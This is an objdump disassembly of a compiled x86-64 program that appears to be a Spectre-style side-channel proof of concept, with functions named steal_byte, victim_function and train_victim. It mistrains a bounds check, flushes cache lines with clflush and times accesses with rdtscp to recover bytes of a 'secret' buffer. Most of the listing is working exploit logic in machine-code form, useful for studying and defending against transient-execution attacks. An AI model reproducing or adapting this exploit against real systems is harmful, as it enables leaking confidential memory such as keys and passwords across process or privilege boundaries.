 99d:	48 98                	cltq   
 99f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9a6:	00 
 9a7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9ab:	48 01 d0             	add    %rdx,%rax
 9ae:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 9b4:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 9b8:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 9bf:	7e d9                	jle    99a <main+0x90>
 9c1:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 9c4:	48 98                	cltq   
 9c6:	48 8d 0d 13 17 20 00 	lea    0x201713(%rip),%rcx        # 2020e0 <secret>
 9cd:	48 8d 15 6c 16 20 00 	lea    0x20166c(%rip),%rdx        # 202040 <buffer>
 9d4:	48 29 d1             	sub    %rdx,%rcx
 9d7:	48 89 ca             	mov    %rcx,%rdx
 9da:	48 01 d0             	add    %rdx,%rax
 9dd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 9e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9e5:	89 c2                	mov    %eax,%edx
 9e7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9eb:	89 d6                	mov    %edx,%esi
 9ed:	48 89 c7             	mov    %rax,%rdi
 9f0:	e8 9b 02 00 00       	callq  c90 <steal_byte>
 9f5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 9f9:	48 89 c7             	mov    %rax,%rdi
 9fc:	e8 5f fd ff ff       	callq  760 <free@plt>
 a01:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 a05:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 a09:	0f 8e 45 ff ff ff    	jle    954 <main+0x4a>
 a0f:	b8 00 00 00 00       	mov    $0x0,%eax
 a14:	c9                   	leaveq 
 a15:	c3                   	retq   

0000000000000a16 <unblock_signal>:
 a16:	55                   	push   %rbp
 a17:	48 89 e5             	mov    %rsp,%rbp
 a1a:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 a21:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 a27:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 a2e:	00 00 
 a30:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 a34:	31 c0                	xor    %eax,%eax
 a36:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a3d:	48 89 c7             	mov    %rax,%rdi
 a40:	e8 6b fd ff ff       	callq  7b0 <sigemptyset@plt>
 a45:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 a4b:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a52:	89 d6                	mov    %edx,%esi
 a54:	48 89 c7             	mov    %rax,%rdi
 a57:	e8 84 fd ff ff       	callq  7e0 <sigaddset@plt>
 a5c:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 a63:	ba 00 00 00 00       	mov    $0x0,%edx
 a68:	48 89 c6             	mov    %rax,%rsi
 a6b:	bf 01 00 00 00       	mov    $0x1,%edi
 a70:	e8 db fc ff ff       	callq  750 <sigprocmask@plt>
 a75:	90                   	nop
 a76:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a7a:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 a81:	00 00 
 a83:	74 05                	je     a8a <unblock_signal+0x74>
 a85:	e8 e6 fc ff ff       	callq  770 <__stack_chk_fail@plt>
 a8a:	c9                   	leaveq 
 a8b:	c3                   	retq   

0000000000000a8c <trycatch_segfault_handler>:
 a8c:	55                   	push   %rbp
 a8d:	48 89 e5             	mov    %rsp,%rbp
 a90:	48 83 ec 10          	sub    $0x10,%rsp
 a94:	89 7d fc             	mov    %edi,-0x4(%rbp)
 a97:	bf 0b 00 00 00       	mov    $0xb,%edi
 a9c:	e8 75 ff ff ff       	callq  a16 <unblock_signal>
 aa1:	bf 08 00 00 00       	mov    $0x8,%edi
 aa6:	e8 6b ff ff ff       	callq  a16 <unblock_signal>
 aab:	be 01 00 00 00       	mov    $0x1,%esi
 ab0:	48 8d 3d a9 16 20 00 	lea    0x2016a9(%rip),%rdi        # 202160 <trycatch_buf>
 ab7:	e8 14 fd ff ff       	callq  7d0 <longjmp@plt>

0000000000000abc <find_cached_index>:
 abc:	55                   	push   %rbp
 abd:	48 89 e5             	mov    %rsp,%rbp
 ac0:	53                   	push   %rbx
 ac1:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 ac5:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 acc:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 ad3:	eb 67                	jmp    b3c <find_cached_index+0x80>
 ad5:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 adc:	00 
 add:	8b 45 e8             	mov    -0x18(%rbp),%eax
 ae0:	c1 e0 0c             	shl    $0xc,%eax
 ae3:	48 63 d0             	movslq %eax,%rdx
 ae6:	48 8d 05 53 17 20 00 	lea    0x201753(%rip),%rax        # 202240 <array>
 aed:	48 01 d0             	add    %rdx,%rax
 af0:	48 89 c3             	mov    %rax,%rbx
 af3:	0f ae f0             	mfence 
 af6:	0f 01 f9             	rdtscp 
 af9:	49 89 c2             	mov    %rax,%r10
 afc:	48 8b 0b             	mov    (%rbx),%rcx
 aff:	0f 01 f9             	rdtscp 
 b02:	4c 29 d0             	sub    %r10,%rax
 b05:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 b09:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 b0e:	77 28                	ja     b38 <find_cached_index+0x7c>
 b10:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
 b14:	74 07                	je     b1d <find_cached_index+0x61>
 b16:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
 b1d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 b20:	48 98                	cltq   
 b22:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b29:	00 
 b2a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 b2e:	48 01 d0             	add    %rdx,%rax
 b31:	8b 10                	mov    (%rax),%edx
 b33:	83 c2 01             	add    $0x1,%edx
 b36:	89 10                	mov    %edx,(%rax)
 b38:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 b3c:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 b43:	7e 90                	jle    ad5 <find_cached_index+0x19>
 b45:	8b 45 ec             	mov    -0x14(%rbp),%eax
 b48:	5b                   	pop    %rbx
 b49:	5d                   	pop    %rbp
 b4a:	c3                   	retq   

0000000000000b4b <find_highest_score>:
 b4b:	55                   	push   %rbp
 b4c:	48 89 e5             	mov    %rsp,%rbp
 b4f:	48 83 ec 30          	sub    $0x30,%rsp
 b53:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 b57:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 b5e:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 b65:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 b6c:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 b73:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 b7a:	eb 4a                	jmp    bc6 <find_highest_score+0x7b>
 b7c:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b7f:	48 98                	cltq   
 b81:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b88:	00 
 b89:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b8d:	48 01 d0             	add    %rdx,%rax
 b90:	8b 00                	mov    (%rax),%eax
 b92:	39 45 ec             	cmp    %eax,-0x14(%rbp)
 b95:	7d 2b                	jge    bc2 <find_highest_score+0x77>
 b97:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b9a:	89 45 f8             	mov    %eax,-0x8(%rbp)
 b9d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 ba0:	89 45 f4             	mov    %eax,-0xc(%rbp)
 ba3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 ba6:	89 45 f0             	mov    %eax,-0x10(%rbp)
 ba9:	8b 45 fc             	mov    -0x4(%rbp),%eax
 bac:	48 98                	cltq   
 bae:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 bb5:	00 
 bb6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 bba:	48 01 d0             	add    %rdx,%rax
 bbd:	8b 00                	mov    (%rax),%eax
 bbf:	89 45 ec             	mov    %eax,-0x14(%rbp)
 bc2:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 bc6:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 bcd:	7e ad                	jle    b7c <find_highest_score+0x31>
 bcf:	8b 7d f4             	mov    -0xc(%rbp),%edi
 bd2:	8b 75 f8             	mov    -0x8(%rbp),%esi
 bd5:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 bd8:	8b 55 f0             	mov    -0x10(%rbp),%edx
 bdb:	8b 45 f0             	mov    -0x10(%rbp),%eax
 bde:	41 89 f9             	mov    %edi,%r9d
 be1:	41 89 f0             	mov    %esi,%r8d
 be4:	89 c6                	mov    %eax,%esi
 be6:	48 8d 3d bb 02 00 00 	lea    0x2bb(%rip),%rdi        # ea8 <_IO_stdin_used+0x8>
 bed:	b8 00 00 00 00       	mov    $0x0,%eax
 bf2:	e8 89 fb ff ff       	callq  780 <printf@plt>
 bf7:	90                   	nop
 bf8:	c9                   	leaveq 
 bf9:	c3                   	retq   

0000000000000bfa <train_victim>:
 bfa:	55                   	push   %rbp
 bfb:	48 89 e5             	mov    %rsp,%rbp
 bfe:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 c05:	eb 44                	jmp    c4b <train_victim+0x51>
 c07:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 c0e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 c15:	eb 1a                	jmp    c31 <train_victim+0x37>
 c17:	8b 45 f4             	mov    -0xc(%rbp),%eax
 c1a:	c1 e0 0c             	shl    $0xc,%eax
 c1d:	48 63 d0             	movslq %eax,%rdx
 c20:	48 8d 05 19 16 20 00 	lea    0x201619(%rip),%rax        # 202240 <array>
 c27:	48 01 d0             	add    %rdx,%rax
 c2a:	0f ae 38             	clflush (%rax)
 c2d:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 c31:	81 7d f4 ff 00 00 00 	cmpl   $0xff,-0xc(%rbp)
 c38:	7e dd                	jle    c17 <train_victim+0x1d>
 c3a:	0f ae f0             	mfence 
 c3d:	48 8d 05 dc 13 20 00 	lea    0x2013dc(%rip),%rax        # 202020 <bufferSize>
 c44:	0f ae 38             	clflush (%rax)
 c47:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
 c4b:	83 7d f0 13          	cmpl   $0x13,-0x10(%rbp)
 c4f:	7e b6                	jle    c07 <train_victim+0xd>
 c51:	0f ae e8             	lfence 
 c54:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 c5b:	eb 1a                	jmp    c77 <train_victim+0x7d>
 c5d:	8b 45 f8             	mov    -0x8(%rbp),%eax
 c60:	c1 e0 0c             	shl    $0xc,%eax
 c63:	48 63 d0             	movslq %eax,%rdx
 c66:	48 8d 05 d3 15 20 00 	lea    0x2015d3(%rip),%rax        # 202240 <array>
 c6d:	48 01 d0             	add    %rdx,%rax
 c70:	0f ae 38             	clflush (%rax)
 c73:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 c77:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 c7e:	7e dd                	jle    c5d <train_victim+0x63>
 c80:	0f ae f0             	mfence 
 c83:	48 8d 05 96 13 20 00 	lea    0x201396(%rip),%rax        # 202020 <bufferSize>
 c8a:	0f ae 38             	clflush (%rax)
 c8d:	90                   	nop
 c8e:	5d                   	pop    %rbp
 c8f:	c3                   	retq   

0000000000000c90 <steal_byte>:
 c90:	55                   	push   %rbp
 c91:	48 89 e5             	mov    %rsp,%rbp
 c94:	53                   	push   %rbx
 c95:	48 83 ec 38          	sub    $0x38,%rsp
 c99:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
 c9d:	89 75 c4             	mov    %esi,-0x3c(%rbp)
 ca0:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 ca7:	e9 09 01 00 00       	jmpq   db5 <steal_byte+0x125>
 cac:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 cb3:	c6 45 db 20          	movb   $0x20,-0x25(%rbp)
 cb7:	e9 e1 00 00 00       	jmpq   d9d <steal_byte+0x10d>
 cbc:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 cc3:	eb 22                	jmp    ce7 <steal_byte+0x57>
 cc5:	be 01 00 00 00       	mov    $0x1,%esi
 cca:	bf 00 00 00 00       	mov    $0x0,%edi
 ccf:	e8 02 01 00 00       	callq  dd6 <victim_function>
 cd4:	be 02 00 00 00       	mov    $0x2,%esi
 cd9:	bf 00 00 00 00       	mov    $0x0,%edi
 cde:	e8 f3 00 00 00       	callq  dd6 <victim_function>
 ce3:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 ce7:	83 7d e4 13          	cmpl   $0x13,-0x1c(%rbp)
 ceb:	7e d8                	jle    cc5 <steal_byte+0x35>
 ced:	48 8d 05 4c 45 20 00 	lea    0x20454c(%rip),%rax        # 205240 <array+0x3000>
 cf4:	0f ae 38             	clflush (%rax)
 cf7:	48 8d 05 22 13 20 00 	lea    0x201322(%rip),%rax        # 202020 <bufferSize>
 cfe:	0f ae 38             	clflush (%rax)
 d01:	0f ae e8             	lfence 
 d04:	0f ae f0             	mfence 
 d07:	48 8d 35 7e fd ff ff 	lea    -0x282(%rip),%rsi        # a8c <trycatch_segfault_handler>
 d0e:	bf 0b 00 00 00       	mov    $0xb,%edi
 d13:	e8 88 fa ff ff       	callq  7a0 <signal@plt>
 d18:	48 8d 3d 41 14 20 00 	lea    0x201441(%rip),%rdi        # 202160 <trycatch_buf>
 d1f:	e8 6c fa ff ff       	callq  790 <_setjmp@plt>
 d24:	85 c0                	test   %eax,%eax
 d26:	75 1b                	jne    d43 <steal_byte+0xb3>
 d28:	b8 00 00 00 00       	mov    $0x0,%eax
 d2d:	0f b6 00             	movzbl (%rax),%eax
 d30:	0f b6 55 db          	movzbl -0x25(%rbp),%edx
 d34:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 d37:	48 98                	cltq   
 d39:	89 d6                	mov    %edx,%esi
 d3b:	48 89 c7             	mov    %rax,%rdi
 d3e:	e8 93 00 00 00       	callq  dd6 <victim_function>
 d43:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
 d4a:	00 
 d4b:	48 8d 05 ee 44 20 00 	lea    0x2044ee(%rip),%rax        # 205240 <array+0x3000>
 d52:	48 89 c3             	mov    %rax,%rbx
 d55:	0f ae f0             	mfence 
 d58:	0f 01 f9             	rdtscp 
 d5b:	49 89 c2             	mov    %rax,%r10
 d5e:	48 8b 0b             	mov    (%rbx),%rcx
 d61:	0f 01 f9             	rdtscp 
 d64:	4c 29 d0             	sub    %r10,%rax
 d67:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 d6b:	48 83 7d e8 77       	cmpq   $0x77,-0x18(%rbp)
 d70:	77 21                	ja     d93 <steal_byte+0x103>
 d72:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%rbp)
 d79:	0f b6 45 db          	movzbl -0x25(%rbp),%eax
 d7d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 d84:	00 
 d85:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
 d89:	48 01 d0             	add    %rdx,%rax
 d8c:	8b 10                	mov    (%rax),%edx
 d8e:	83 c2 01             	add    $0x1,%edx
 d91:	89 10                	mov    %edx,(%rax)
 d93:	0f b6 45 db          	movzbl -0x25(%rbp),%eax
 d97:	83 c0 01             	add    $0x1,%eax
 d9a:	88 45 db             	mov    %al,-0x25(%rbp)
 d9d:	80 7d db 79          	cmpb   $0x79,-0x25(%rbp)
 da1:	0f 86 15 ff ff ff    	jbe    cbc <steal_byte+0x2c>
 da7:	83 7d e0 00          	cmpl   $0x0,-0x20(%rbp)
 dab:	75 04                	jne    db1 <steal_byte+0x121>
 dad:	83 6d dc 01          	subl   $0x1,-0x24(%rbp)
 db1:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 db5:	81 7d dc e7 03 00 00 	cmpl   $0x3e7,-0x24(%rbp)
 dbc:	0f 8e ea fe ff ff    	jle    cac <steal_byte+0x1c>
 dc2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
 dc6:	48 89 c7             	mov    %rax,%rdi
 dc9:	e8 7d fd ff ff       	callq  b4b <find_highest_score>
 dce:	90                   	nop
 dcf:	48 83 c4 38          	add    $0x38,%rsp
 dd3:	5b                   	pop    %rbx
 dd4:	5d                   	pop    %rbp
 dd5:	c3                   	retq   

0000000000000dd6 <victim_function>:
 dd6:	55                   	push   %rbp
 dd7:	48 89 e5             	mov    %rsp,%rbp
 dda:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 dde:	89 f0                	mov    %esi,%eax
 de0:	88 45 f4             	mov    %al,-0xc(%rbp)
 de3:	8b 05 37 12 20 00    	mov    0x201237(%rip),%eax        # 202020 <bufferSize>
 de9:	48 98                	cltq   
 deb:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 def:	73 2c                	jae    e1d <victim_function+0x47>
 df1:	48 8d 15 48 12 20 00 	lea    0x201248(%rip),%rdx        # 202040 <buffer>
 df8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 dfc:	48 01 d0             	add    %rdx,%rax
 dff:	0f b6 00             	movzbl (%rax),%eax
 e02:	38 45 f4             	cmp    %al,-0xc(%rbp)
 e05:	75 16                	jne    e1d <victim_function+0x47>
 e07:	0f b6 15 32 44 20 00 	movzbl 0x204432(%rip),%edx        # 205240 <array+0x3000>
 e0e:	0f b6 05 2b 13 20 00 	movzbl 0x20132b(%rip),%eax        # 202140 <temp>
 e15:	21 d0                	and    %edx,%eax
 e17:	88 05 23 13 20 00    	mov    %al,0x201323(%rip)        # 202140 <temp>
 e1d:	90                   	nop
 e1e:	5d                   	pop    %rbp
 e1f:	c3                   	retq   

0000000000000e20 <__libc_csu_init>:
 e20:	41 57                	push   %r15
 e22:	41 56                	push   %r14
 e24:	49 89 d7             	mov    %rdx,%r15
 e27:	41 55                	push   %r13
 e29:	41 54                	push   %r12
 e2b:	4c 8d 25 3e 0f 20 00 	lea    0x200f3e(%rip),%r12        # 201d70 <__frame_dummy_init_array_entry>
 e32:	55                   	push   %rbp
 e33:	48 8d 2d 3e 0f 20 00 	lea    0x200f3e(%rip),%rbp        # 201d78 <__init_array_end>
 e3a:	53                   	push   %rbx
 e3b:	41 89 fd             	mov    %edi,%r13d
 e3e:	49 89 f6             	mov    %rsi,%r14
 e41:	4c 29 e5             	sub    %r12,%rbp
 e44:	48 83 ec 08          	sub    $0x8,%rsp
 e48:	48 c1 fd 03          	sar    $0x3,%rbp
 e4c:	e8 cf f8 ff ff       	callq  720 <_init>
 e51:	48 85 ed             	test   %rbp,%rbp
 e54:	74 20                	je     e76 <__libc_csu_init+0x56>
 e56:	31 db                	xor    %ebx,%ebx
 e58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 e5f:	00 
 e60:	4c 89 fa             	mov    %r15,%rdx
 e63:	4c 89 f6             	mov    %r14,%rsi
 e66:	44 89 ef             	mov    %r13d,%edi
 e69:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 e6d:	48 83 c3 01          	add    $0x1,%rbx
 e71:	48 39 dd             	cmp    %rbx,%rbp
 e74:	75 ea                	jne    e60 <__libc_csu_init+0x40>
 e76:	48 83 c4 08          	add    $0x8,%rsp
 e7a:	5b                   	pop    %rbx
 e7b:	5d                   	pop    %rbp
 e7c:	41 5c                	pop    %r12
 e7e:	41 5d                	pop    %r13
 e80:	41 5e                	pop    %r14
 e82:	41 5f                	pop    %r15
 e84:	c3                   	retq   
 e85:	90                   	nop
 e86:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 e8d:	00 00 00 

0000000000000e90 <__libc_csu_fini>:
 e90:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000e94 <_fini>:
 e94:	48 83 ec 08          	sub    $0x8,%rsp
 e98:	48 83 c4 08          	add    $0x8,%rsp
 e9c:	c3                   	retq   

Disassembly of section .rodata:

0000000000000ea0 <_IO_stdin_used>:
 ea0:	01 00                	add    %eax,(%rax)
 ea2:	02 00                	add    (%rax),%al
 ea4:	00 00                	add    %al,(%rax)
 ea6:	00 00                	add    %al,(%rax)
 ea8:	4c                   	rex.WR
 ea9:	65 74 74             	gs je  f20 <__GNU_EH_FRAME_HDR+0x3c>
 eac:	65 72 3a             	gs jb  ee9 <__GNU_EH_FRAME_HDR+0x5>
 eaf:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 49201818 <_end+0x48eff5d8>
 eb5:	6e                   	outsb  %ds:(%rsi),(%dx)
 eb6:	64 65 78 3a          	fs gs js ef4 <__GNU_EH_FRAME_HDR+0x10>
 eba:	20 25 64 09 20 48    	and    %ah,0x48200964(%rip)        # 48201824 <_end+0x47eff5e4>
 ec0:	69 74 73 3a 25 64 20 	imul   $0x9206425,0x3a(%rbx,%rsi,2),%esi
 ec7:	09 
 ec8:	20 53 65             	and    %dl,0x65(%rbx)
 ecb:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
 ece:	64 47 75 65          	fs rex.RXB jne f37 <__GNU_EH_FRAME_HDR+0x53>
 ed2:	73 73                	jae    f47 <__GNU_EH_FRAME_HDR+0x63>
 ed4:	3a 25 63 20 09 20    	cmp    0x20092063(%rip),%ah        # 20092f3d <_end+0x1fd90cfd>
 eda:	48 69 74 73 3a 25 64 	imul   $0xa6425,0x3a(%rbx,%rsi,2),%rsi
 ee1:	0a 00 

Disassembly of section .eh_frame_hdr:

0000000000000ee4 <__GNU_EH_FRAME_HDR>:
 ee4:	01 1b                	add    %ebx,(%rbx)
 ee6:	03 3b                	add    (%rbx),%edi
 ee8:	70 00                	jo     eea <__GNU_EH_FRAME_HDR+0x6>
 eea:	00 00                	add    %al,(%rax)
 eec:	0d 00 00 00 5c       	or     $0x5c000000,%eax
 ef1:	f8                   	clc    
 ef2:	ff                   	(bad)  
 ef3:	ff                   	(bad)  
 ef4:	bc 00 00 00 0c       	mov    $0xc000000,%esp
 ef9:	f9                   	stc    
 efa:	ff                   	(bad)  
 efb:	ff e4                	jmpq   *%rsp
 efd:	00 00                	add    %al,(%rax)
 eff:	00 1c f9             	add    %bl,(%rcx,%rdi,8)
 f02:	ff                   	(bad)  
 f03:	ff 8c 00 00 00 26 fa 	decl   -0x5da0000(%rax,%rax,1)
 f0a:	ff                   	(bad)  
 f0b:	ff                   	(bad)  
 f0c:	fc                   	cld    
 f0d:	00 00                	add    %al,(%rax)
 f0f:	00 32                	add    %dh,(%rdx)
 f11:	fb                   	sti    
 f12:	ff                   	(bad)  
 f13:	ff 1c 01             	lcall  *(%rcx,%rax,1)
 f16:	00 00                	add    %al,(%rax)
 f18:	a8 fb                	test   $0xfb,%al
 f1a:	ff                   	(bad)  
 f1b:	ff                   	(bad)  
 f1c:	3c 01                	cmp    $0x1,%al
 f1e:	00 00                	add    %al,(%rax)
 f20:	d8 fb                	fdivr  %st(3),%st
 f22:	ff                   	(bad)  
 f23:	ff 58 01             	lcall  *0x1(%rax)
 f26:	00 00                	add    %al,(%rax)
 f28:	67 fc                	addr32 cld 
 f2a:	ff                   	(bad)  
 f2b:	ff                   	(bad)  
 f2c:	7c 01                	jl     f2f <__GNU_EH_FRAME_HDR+0x4b>
 f2e:	00 00                	add    %al,(%rax)
 f30:	16                   	(bad)  
 f31:	fd                   	std    
 f32:	ff                   	(bad)  
 f33:	ff 9c 01 00 00 ac fd 	lcall  *-0x2540000(%rcx,%rax,1)
 f3a:	ff                   	(bad)  
 f3b:	ff                   	(bad)  
 f3c:	bc 01 00 00 f2       	mov    $0xf2000001,%esp
 f41:	fe                   	(bad)  
 f42:	ff                   	(bad)  
 f43:	ff e4                	jmpq   *%rsp
 f45:	01 00                	add    %eax,(%rax)
 f47:	00 3c ff             	add    %bh,(%rdi,%rdi,8)
 f4a:	ff                   	(bad)  
 f4b:	ff 04 02             	incl   (%rdx,%rax,1)
 f4e:	00 00                	add    %al,(%rax)
 f50:	ac                   	lods   %ds:(%rsi),%al
 f51:	ff                   	(bad)  
 f52:	ff                   	(bad)  
 f53:	ff 4c 02 00          	decl   0x0(%rdx,%rax,1)
	...

Disassembly of section .eh_frame:

0000000000000f58 <__FRAME_END__-0x1ec>:
     f58:	14 00                	adc    $0x0,%al
     f5a:	00 00                	add    %al,(%rax)
     f5c:	00 00                	add    %al,(%rax)
     f5e:	00 00                	add    %al,(%rax)
     f60:	01 7a 52             	add    %edi,0x52(%rdx)
     f63:	00 01                	add    %al,(%rcx)
     f65:	78 10                	js     f77 <__GNU_EH_FRAME_HDR+0x93>
     f67:	01 1b                	add    %ebx,(%rbx)
     f69:	0c 07                	or     $0x7,%al
     f6b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
     f71:	00 00                	add    %al,(%rax)
     f73:	00 1c 00             	add    %bl,(%rax,%rax,1)
     f76:	00 00                	add    %al,(%rax)
     f78:	88 f8                	mov    %bh,%al
     f7a:	ff                   	(bad)  
     f7b:	ff 2b                	ljmp   *(%rbx)
	...
     f85:	00 00                	add    %al,(%rax)
     f87:	00 14 00             	add    %dl,(%rax,%rax,1)
     f8a:	00 00                	add    %al,(%rax)
     f8c:	00 00                	add    %al,(%rax)
     f8e:	00 00                	add    %al,(%rax)
     f90:	01 7a 52             	add    %edi,0x52(%rdx)
     f93:	00 01                	add    %al,(%rcx)
     f95:	78 10                	js     fa7 <__GNU_EH_FRAME_HDR+0xc3>
     f97:	01 1b                	add    %ebx,(%rbx)
     f99:	0c 07                	or     $0x7,%al
     f9b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
     fa1:	00 00                	add    %al,(%rax)
     fa3:	00 1c 00             	add    %bl,(%rax,%rax,1)
     fa6:	00 00                	add    %al,(%rax)
     fa8:	98                   	cwtl   
     fa9:	f7 ff                	idiv   %edi
     fab:	ff b0 00 00 00 00    	pushq  0x0(%rax)
     fb1:	0e                   	(bad)  
     fb2:	10 46 0e             	adc    %al,0xe(%rsi)
     fb5:	18 4a 0f             	sbb    %cl,0xf(%rdx)
     fb8:	0b 77 08             	or     0x8(%rdi),%esi
     fbb:	80 00 3f             	addb   $0x3f,(%rax)
     fbe:	1a 3b                	sbb    (%rbx),%bh
     fc0:	2a 33                	sub    (%rbx),%dh
     fc2:	24 22                	and    $0x22,%al
     fc4:	00 00                	add    %al,(%rax)
     fc6:	00 00                	add    %al,(%rax)
     fc8:	14 00                	adc    $0x0,%al
     fca:	00 00                	add    %al,(%rax)
     fcc:	44 00 00             	add    %r8b,(%rax)
     fcf:	00 20                	add    %ah,(%rax)
     fd1:	f8                   	clc    
     fd2:	ff                   	(bad)  
     fd3:	ff 08                	decl   (%rax)
	...
     fdd:	00 00                	add    %al,(%rax)
     fdf:	00 1c 00             	add    %bl,(%rax,%rax,1)
     fe2:	00 00                	add    %al,(%rax)
     fe4:	5c                   	pop    %rsp
     fe5:	00 00                	add    %al,(%rax)
     fe7:	00 22                	add    %ah,(%rdx)
     fe9:	f9                   	stc    
     fea:	ff                   	(bad)  
     feb:	ff 0c 01             	decl   (%rcx,%rax,1)
     fee:	00 00                	add    %al,(%rax)
     ff0:	00 41 0e             	add    %al,0xe(%rcx)
     ff3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
     ff9:	03 07                	add    (%rdi),%eax
     ffb:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
     ffe:	08 00                	or     %al,(%rax)
    1000:	1c 00                	sbb    $0x0,%al
    1002:	00 00                	add    %al,(%rax)
    1004:	7c 00                	jl     1006 <__GNU_EH_FRAME_HDR+0x122>
    1006:	00 00                	add    %al,(%rax)
    1008:	0e                   	(bad)  
    1009:	fa                   	cli    
    100a:	ff                   	(bad)  
    100b:	ff 76 00             	pushq  0x0(%rsi)
    100e:	00 00                	add    %al,(%rax)
    1010:	00 41 0e             	add    %al,0xe(%rcx)
    1013:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1019:	02 71 0c             	add    0xc(%rcx),%dh
    101c:	07                   	(bad)  
    101d:	08 00                	or     %al,(%rax)
    101f:	00 18                	add    %bl,(%rax)
    1021:	00 00                	add    %al,(%rax)
    1023:	00 9c 00 00 00 64 fa 	add    %bl,-0x59c0000(%rax,%rax,1)
    102a:	ff                   	(bad)  
    102b:	ff 30                	pushq  (%rax)
    102d:	00 00                	add    %al,(%rax)
    102f:	00 00                	add    %al,(%rax)
    1031:	41 0e                	rex.B (bad) 
    1033:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1039:	00 00                	add    %al,(%rax)
    103b:	00 20                	add    %ah,(%rax)
    103d:	00 00                	add    %al,(%rax)
    103f:	00 b8 00 00 00 78    	add    %bh,0x78000000(%rax)
    1045:	fa                   	cli    
    1046:	ff                   	(bad)  
